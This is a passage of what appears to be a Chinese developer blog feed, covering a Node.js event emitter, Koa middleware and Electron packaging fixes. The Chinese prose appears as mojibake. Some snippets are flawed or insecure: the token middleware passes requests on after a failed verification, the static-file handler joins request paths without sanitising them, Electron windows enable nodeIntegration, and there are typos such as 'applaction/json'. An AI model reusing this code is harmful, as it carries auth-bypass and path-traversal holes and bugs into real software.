<span class="keyword">if</span> (!<span class="keyword">this</span>.events[type]) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.events[type] = <span class="keyword">this</span>.events[type].filter(<span class="function"><span class="params">item</span> =&gt;</span> item !== handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  off(type,handler)&#123;</span><br><span class="line">    <span class="keyword">this</span>.removeListener(type,handler)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  emit(type, ...args) &#123;</span><br><span class="line">    <span class="keyword">this</span>.events[type].forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">Reflect</span>.apply(item, <span class="keyword">this</span>, args);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  once(type, handler) &#123;</span><br><span class="line">    <span class="keyword">this</span>.on(type, <span class="keyword">this</span>._onceWrap(type, handler, <span class="keyword">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _onceWrap(type, handler, target) &#123;</span><br><span class="line">    <span class="keyword">const</span> state = &#123; <span class="attr">fired</span>: <span class="literal">false</span>, handler, type , target&#125;;</span><br><span class="line">    <span class="keyword">const</span> wrapFn = <span class="keyword">this</span>._onceWrapper.bind(state);</span><br><span class="line">    state.wrapFn = wrapFn;</span><br><span class="line">    <span class="keyword">return</span> wrapFn;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _onceWrapper(...args) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.fired) &#123;</span><br><span class="line">      <span class="keyword">this</span>.fired = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">Reflect</span>.apply(<span class="keyword">this</span>.handler, <span class="keyword">this</span>.target, args);</span><br><span class="line">      <span class="keyword">this</span>.target.off(<span class="keyword">this</span>.type, <span class="keyword">this</span>.wrapFn);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-path"><a href="#7-path" class="headerlink" title="7. path"></a>7. path</h3><p><br></p><h3 id="8-ä¸­é—´ä»¶"><a href="#8-ä¸­é—´ä»¶" class="headerlink" title="8. ä¸­é—´ä»¶"></a>8. ä¸­é—´ä»¶</h3><p>åœ¨NodeJSä¸­ï¼Œä¸­é—´ä»¶æŒ‡å°è£…<code>http</code>è¯·æ±‚ç»†èŠ‚å¤„ç†çš„æ–¹æ³•ï¼Œå¦‚express, koaé‡Œï¼Œé€šè¿‡å°†å…¬å…±é€»è¾‘çš„å¤„ç†ç¼–å†™åœ¨ä¸­é—´ä»¶ä¸­ï¼Œå¯ä»¥ä¸ç”¨åœ¨æ¯ä¸€ä¸ªæ¥å£å›è°ƒä¸­åšç›¸åŒçš„ä»£ç ç¼–å†™ã€‚</p><ul><li><p>tokenæ ¡éªŒ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">options</span>) =&gt;</span> <span class="keyword">async</span> (ctx, next) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = ctx.header.authorization</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> verify(token) <span class="comment">// éªŒè¯ tokenï¼Œå¹¶è·å–ç”¨æˆ·ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> next() <span class="comment">// è¿›å…¥ä¸‹ä¸€ä¸ªä¸­é—´ä»¶</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ—¥å¿—æ¨¡å—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">options</span>) =&gt;</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> startTime = <span class="built_in">Date</span>.now()</span><br><span class="line">  <span class="keyword">const</span> requestTime = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">  <span class="keyword">await</span> next()</span><br><span class="line">  <span class="keyword">const</span> ms = <span class="built_in">Date</span>.now() - startTime;</span><br><span class="line">  <span class="keyword">let</span> logout = <span class="string">`<span class="subst">$&#123;ctx.request.ip&#125;</span> -- <span class="subst">$&#123;requestTime&#125;</span> -- <span class="subst">$&#123;ctx.method&#125;</span> -- <span class="subst">$&#123;ctx.url&#125;</span> -- <span class="subst">$&#123;ms&#125;</span>ms`</span>;</span><br><span class="line">  <span class="comment">// è¾“å‡ºæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">  fs.appendFileSync(<span class="string">'./log.txt'</span>, logout + <span class="string">'\n'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>koa-bodyParser<br>å°†æˆ‘ä»¬çš„ post è¯·æ±‚å’Œè¡¨å•æäº¤çš„æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡ï¼Œå¹¶æŒ‚åœ¨ ctx.request.body ä¸Šï¼Œæ–¹ä¾¿æˆ‘ä»¬åœ¨å…¶ä»–ä¸­é—´ä»¶æˆ–æ¥å£å¤„å–å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼šmy-koa-bodyparser.js</span></span><br><span class="line"><span class="keyword">const</span> querystring = <span class="built_in">require</span>(<span class="string">"querystring"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">bodyParser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// å­˜å‚¨æ•°æ®çš„æ•°ç»„</span></span><br><span class="line">      <span class="keyword">let</span> dataArr = [];</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ¥æ”¶æ•°æ®</span></span><br><span class="line">      ctx.req.on(<span class="string">"data"</span>, data =&gt; dataArr.push(data));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ•´åˆæ•°æ®å¹¶ä½¿ç”¨ Promise æˆåŠŸ</span></span><br><span class="line">      ctx.req.on(<span class="string">"end"</span>, () =&gt; &#123;</span><br><span class="line">        <span class="comment">// è·å–è¯·æ±‚æ•°æ®çš„ç±»å‹ json æˆ–è¡¨å•</span></span><br><span class="line">        <span class="keyword">let</span> contentType = ctx.get(<span class="string">"Content-Type"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ•°æ® Buffer æ ¼å¼</span></span><br><span class="line">        <span class="keyword">let</span> data = Buffer.concat(dataArr).toString();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contentType === <span class="string">"application/x-www-form-urlencoded"</span>) &#123;</span><br><span class="line">          <span class="comment">// å¦‚æœæ˜¯è¡¨å•æäº¤ï¼Œåˆ™å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡èµ‹å€¼ç»™ ctx.request.body</span></span><br><span class="line">          ctx.request.body = querystring.parse(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (contentType === <span class="string">"applaction/json"</span>) &#123;</span><br><span class="line">          <span class="comment">// å¦‚æœæ˜¯ jsonï¼Œåˆ™å°†å­—ç¬¦ä¸²æ ¼å¼çš„å¯¹è±¡è½¬æ¢æˆå¯¹è±¡èµ‹å€¼ç»™ ctx.request.body</span></span><br><span class="line">          ctx.request.body = <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡ŒæˆåŠŸçš„å›è°ƒ</span></span><br><span class="line">        resolve();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»§ç»­å‘ä¸‹æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">await</span> next();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>koa-static<br>æ˜¯åœ¨æœåŠ¡å™¨æ¥åˆ°è¯·æ±‚æ—¶ï¼Œå¸®æˆ‘ä»¬å¤„ç†é™æ€æ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"><span class="keyword">const</span> mime = <span class="built_in">require</span>(<span class="string">"mime"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; promisify &#125; = <span class="built_in">require</span>(<span class="string">"util"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°† stat å’Œ access è½¬æ¢æˆ Promise</span></span><br><span class="line"><span class="keyword">const</span> stat = promisify(fs.stat);</span><br><span class="line"><span class="keyword">const</span> access = promisify(fs.access)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">dir</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">      <span class="comment">// å°†è®¿é—®çš„è·¯ç”±å¤„ç†æˆç»å¯¹è·¯å¾„ï¼Œè¿™é‡Œè¦ä½¿ç”¨ join å› ä¸ºæœ‰å¯èƒ½æ˜¯ /</span></span><br><span class="line">      <span class="keyword">let</span> realPath = path.join(dir, ctx.path);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è·å– stat å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">let</span> statObj = <span class="keyword">await</span> stat(realPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯æ–‡ä»¶ï¼Œåˆ™è®¾ç½®æ–‡ä»¶ç±»å‹å¹¶ç›´æ¥å“åº”å†…å®¹ï¼Œå¦åˆ™å½“ä½œæ–‡ä»¶å¤¹å¯»æ‰¾ index.html</span></span><br><span class="line">        <span class="keyword">if</span> (statObj.isFile()) &#123;</span><br><span class="line">          ctx.set(<span class="string">"Content-Type"</span>, <span class="string">`<span class="subst">$&#123;mime.getType()&#125;</span>;charset=utf8`</span>);</span><br><span class="line">          ctx.body = fs.createReadStream(realPath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> filename = path.join(realPath, <span class="string">"index.html"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// å¦‚æœä¸å­˜åœ¨è¯¥æ–‡ä»¶åˆ™æ‰§è¡Œ catch ä¸­çš„ next äº¤ç»™å…¶ä»–ä¸­é—´ä»¶å¤„ç†</span></span><br><span class="line">          <span class="keyword">await</span> access(filename);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// å­˜åœ¨è®¾ç½®æ–‡ä»¶ç±»å‹å¹¶å“åº”å†…å®¹</span></span><br><span class="line">          ctx.set(<span class="string">"Content-Type"</span>, <span class="string">"text/html;charset=utf8"</span>);</span><br><span class="line">          ctx.body = fs.createReadStream(filename);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.zhihu.com/search?type=content&amp;q=nodejs%E6%96%87%E6%A1%A3" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« æ„å»ºä½ çš„ NodeJS çŸ¥è¯†ä½“ç³»</a></li><li><a href="https://i5ting.github.io/How-to-learn-node-correctly/" target="_blank" rel="noopener">ç‹¼å”ï¼šå¦‚ä½•æ­£ç¡®çš„å­¦ä¹ Node.js</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Electronç¢°åˆ°çš„é—®é¢˜</title>
      <link href="/2019/09/19/electron%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/2019/09/19/electron%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<blockquote><p>é¡¹ç›®ä½¿ç”¨create-react-appæ­å»ºï¼Œæœ¬åœ°å¼€å‘æ—¶å€™ï¼Œå…ˆè·‘èµ·ä¸€ä¸ªWebServerï¼Œå†ç”¨electronåŠ è½½<code>localhost:8000</code>é¡µé¢ï¼Œèµ°çš„æ˜¯httpåè®®ã€‚æ‰“åŒ…åï¼Œå› ä¸ºè®¿é—®çš„æ˜¯æœ¬åœ°æ–‡ä»¶ï¼Œèµ°çš„æ˜¯fileåè®®ã€‚å› æ­¤ä¼šå‡ºç°ä¸å°‘é—®é¢˜â€¦</p></blockquote><p><br></p><h3 id="1-æ¸²æŸ“è¿›ç¨‹ä½¿ç”¨Nodeæ¨¡å—"><a href="#1-æ¸²æŸ“è¿›ç¨‹ä½¿ç”¨Nodeæ¨¡å—" class="headerlink" title="1. æ¸²æŸ“è¿›ç¨‹ä½¿ç”¨Nodeæ¨¡å—"></a>1. æ¸²æŸ“è¿›ç¨‹ä½¿ç”¨Nodeæ¨¡å—</h3><p>Node. js çš„æ‰€æœ‰ å†…ç½®æ¨¡å— éƒ½åœ¨Electronä¸­å¯ç”¨ï¼Œ ç¬¬ä¸‰æ–¹ node æ¨¡å—ä¸­ä¹Ÿå®Œå…¨æ”¯æŒã€‚æ¸²æŸ“è¿›ç¨‹é™¤äº†é¢å¤–èƒ½å¤Ÿä½¿ç”¨nodeæ¨¡å—çš„èƒ½åŠ›å¤–ï¼Œä¸æ™®é€šç½‘é¡µæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> &#123; app &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>).remote</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(app.getVersion())</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-è¯·æ±‚-url-ä¸ºç»å¯¹è·¯å¾„"><a href="#2-è¯·æ±‚-url-ä¸ºç»å¯¹è·¯å¾„" class="headerlink" title="2. è¯·æ±‚ url ä¸ºç»å¯¹è·¯å¾„"></a>2. è¯·æ±‚ url ä¸ºç»å¯¹è·¯å¾„</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> host =</span><br><span class="line">  process.env.NODE_ENV === <span class="string">'development'</span> ? <span class="string">''</span> : <span class="string">'http://v3.yingliboke.cn/api'</span>;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-è·¯ç”±å¤±æ•ˆ"><a href="#3-è·¯ç”±å¤±æ•ˆ" class="headerlink" title="3. è·¯ç”±å¤±æ•ˆ"></a>3. è·¯ç”±å¤±æ•ˆ</h3><p>ä¸€å¼€å§‹ç”¨çš„ React-router çš„ <code>&lt;BrowserRouter&gt;</code>æ‰“å¼€åï¼Œé¡µé¢ä¸€ç‰‡ç©ºç™½ã€‚è¦ä½¿ç”¨<code>&lt;HashRouter&gt;</code>ï¼Œå¹¶è®¾ç½®<code>hashType: &#39;noslash&#39;</code> -&gt; <code>index.html#liveroom</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Router.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; HashRouter, Route &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">AppRouter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;HashRouter hashType=<span class="string">"noslash"</span>&gt;</span><br><span class="line">      &lt;Route exact path=<span class="string">"/"</span> component=&#123;Login&#125; /&gt;</span><br><span class="line">      &lt;Route path=<span class="string">"/liveroom"</span> component=&#123;Liveroom&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/HashRouter&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>electron å…¥å£æ–‡ä»¶ï¼Œæ‰“åŒ…åå¯ä»¥ç›´æ¥è¿›å…¥liveroomè·¯ç”±<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> startUrl;</span><br><span class="line"><span class="keyword">if</span> (isDev) &#123;</span><br><span class="line">  startUrl = <span class="string">'http://localhost:8000#liveroom'</span>;</span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  startUrl = url.format(&#123;</span><br><span class="line">    pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">    protocol: <span class="string">'file:'</span>,</span><br><span class="line">    slashes: <span class="literal">false</span>,</span><br><span class="line">    hash: <span class="string">'liveroom'</span></span><br><span class="line">  &#125;);</span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-window-locationä¸å¯ç”¨"><a href="#4-window-locationä¸å¯ç”¨" class="headerlink" title="4. window.locationä¸å¯ç”¨"></a>4. window.locationä¸å¯ç”¨</h3><p>å½“ä½¿ç”¨ api(å¦‚ webContents.loadURL å’Œ webContents.back) æ¥ä¿®æ”¹å¯¼èˆªçš„æ—¶å€™ï¼Œè¿™ä¸ªäº‹ä»¶å°†ä¸ä¼šå‘å‡ºï¼Œå®ƒä¹Ÿä¸ä¼šåœ¨é¡µå†…å‘ç”Ÿè·³è½¬ã€‚<br>ä½¿ç”¨<code>did-navigate-in-page</code>äº‹ä»¶å¯ä»¥ç›‘å¬åˆ° â€”â€” ç‚¹å‡»é”šé“¾æ¥æˆ–æ›´æ–° window.location.hashã€‚è°ƒç”¨ event.preventDefault() å¯ä»¥é»˜è®¤äº‹ä»¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Page navigate</span></span><br><span class="line">mainWindow.webContents.on(<span class="string">'did-navigate-in-page'</span>, (event, url) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> before = mainWindow.webContents.getURL();</span><br><span class="line">  <span class="keyword">if</span> (!isDev &amp;&amp; before !== url) &#123;</span><br><span class="line">    <span class="comment">// è¦è·³è½¬çš„urlå’Œå½“å‰urlä¸åŒæ—¶ï¼Œæ‰è·³è½¬</span></span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">const</span> hash = url.split(<span class="string">'#'</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">const</span> startUrl = <span class="built_in">require</span>(<span class="string">'url'</span>).format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">false</span>,</span><br><span class="line">      hash</span><br><span class="line">    &#125;);</span><br><span class="line">    mainWindow.loadURL(startUrl);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åœ¨ä»£ç ä¸­ç»Ÿä¸€ä½¿ç”¨ä¿®æ”¹ hash å€¼ï¼Œè¿›è¡Œè·¯ç”±è·³è½¬</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.hash = <span class="string">'liveroom'</span>;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-é¦–æ¬¡è¿›å…¥é¡µé¢ç™½å±"><a href="#5-é¦–æ¬¡è¿›å…¥é¡µé¢ç™½å±" class="headerlink" title="5. é¦–æ¬¡è¿›å…¥é¡µé¢ç™½å±"></a>5. é¦–æ¬¡è¿›å…¥é¡µé¢ç™½å±</h3><p>åœ¨åŠ è½½é¡µé¢æ—¶ï¼Œæ¸²æŸ“è¿›ç¨‹ç¬¬ä¸€æ¬¡å®Œæˆç»˜åˆ¶æ—¶ï¼Œä¼šå‘å‡º ready-to-show äº‹ä»¶ ã€‚ åœ¨æ­¤äº‹ä»¶åæ˜¾ç¤ºçª—å£å°†æ²¡æœ‰è§†è§‰é—ªçƒï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; BrowserWindow &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>);</span><br><span class="line"><span class="keyword">let</span> win = <span class="keyword">new</span> BrowserWindow(&#123; <span class="attr">show</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">win.once(<span class="string">'ready-to-show'</span>, () =&gt; &#123;</span><br><span class="line">  win.show();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªäº‹ä»¶é€šå¸¸åœ¨ did-finish-load äº‹ä»¶ä¹‹åå‘å‡ºï¼Œä½†æ˜¯é¡µé¢æœ‰è®¸å¤šè¿œç¨‹èµ„æºæ—¶ï¼Œå®ƒå¯èƒ½ä¼šåœ¨ did-finish-load ä¹‹å‰å‘å‡ºäº‹ä»¶ã€‚</p><p><br></p><h3 id="6-framelessçª—å£è®¾ç½®æ‹–åŠ¨åŒºåŸŸ"><a href="#6-framelessçª—å£è®¾ç½®æ‹–åŠ¨åŒºåŸŸ" class="headerlink" title="6. framelessçª—å£è®¾ç½®æ‹–åŠ¨åŒºåŸŸ"></a>6. framelessçª—å£è®¾ç½®æ‹–åŠ¨åŒºåŸŸ</h3><p>æ³¨æ„ï¼Œmac å…³é—­äº† devTool æ‹–åŠ¨æ‰èƒ½ç”Ÿæ•ˆ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div</span> &#123;</span><br><span class="line">  <span class="attribute">-webkit-user-select</span>: none;</span><br><span class="line">  <span class="attribute">-webkit-app-region</span>: drag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-æ‰“å¼€æ–°çª—å£"><a href="#7-æ‰“å¼€æ–°çª—å£" class="headerlink" title="7. æ‰“å¼€æ–°çª—å£"></a>7. æ‰“å¼€æ–°çª—å£</h3><p>éœ€è¦å…¨å±€å®šä¹‰ä¸€ä¸ª<code>win</code>å˜é‡æ¥å­˜å‚¨æ‰€æœ‰æ–°çª—å£ï¼Œä¸ç„¶å…³é—­çª—å£ä¼šæŠ¥é”™ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> win = &#123;&#125;;</span><br><span class="line">ipcMain.on(<span class="string">'newwin'</span>, (event, value) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; width, height, minWidth, minHeight, hash &#125; = value;</span><br><span class="line">  win[hash] = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width,</span><br><span class="line">    height,</span><br><span class="line">    minHeight,</span><br><span class="line">    minWidth,</span><br><span class="line">    fullscreenable: <span class="literal">false</span>,</span><br><span class="line">    titleBarStyle: <span class="string">'hidden'</span>,</span><br><span class="line">    parent: mainWindow,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      nodeIntegration: <span class="literal">true</span> <span class="comment">//è®¾ç½®æ­¤å¤„</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> startUrl;</span><br><span class="line">  <span 